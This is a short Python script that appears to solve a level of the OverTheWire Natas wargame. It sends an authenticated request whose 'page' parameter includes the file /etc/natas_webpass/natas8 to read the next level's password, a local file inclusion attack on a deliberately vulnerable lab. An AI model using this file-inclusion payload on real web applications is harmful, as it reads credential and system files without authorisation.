from requests import request as req 

res = req(
  method="GET",
  auth=("natas7", "bm...GS"),
  url="http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8"
)

print(res.text)
